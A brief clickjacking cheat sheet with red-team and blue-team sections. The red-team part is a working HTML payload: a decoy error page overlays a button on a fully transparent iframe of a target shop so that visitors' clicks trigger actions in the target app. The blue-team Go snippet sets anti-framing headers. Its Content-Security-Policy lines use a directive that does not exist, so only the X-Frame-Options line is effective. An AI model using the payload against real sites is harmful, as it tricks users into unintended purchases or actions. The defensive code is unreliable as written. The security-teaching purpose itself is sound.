# Clickjacking

## Red Team

Create a button that is positioned at the same location that a target app's button would be. Then load a transparent iframe of the target application on your own page. When a visitor clicks on your button, they will also be clicking on the target application button.

```html
<!-- fake.example.com/some-special-offer -->
<html>
  <body>
    <p>Server Error. Please try again later</p>

    <!-- button should be positioned to overlap with one of the target app's buttons -->
    <button>Back to main page</button>

    <!-- iframe is an invisible overlay of the target app's shop page -->
    <iframe src="https://real.example.com/shop" frameborder="1" style="opacity: 0"></iframe>
  </body>
</html>
```

## Blue Team

Use the [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) and [X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options) (X-Frame-Options has wider browser support) headers to restrict framing of your web app.

```go
w.Header().Set("Content-Security-Policy", "frame-options 'deny'")
w.Header().Set("X-Content-Security-Policy", "frame-options 'deny'")
w.Header().Set("X-Frame-Options", "deny")
```
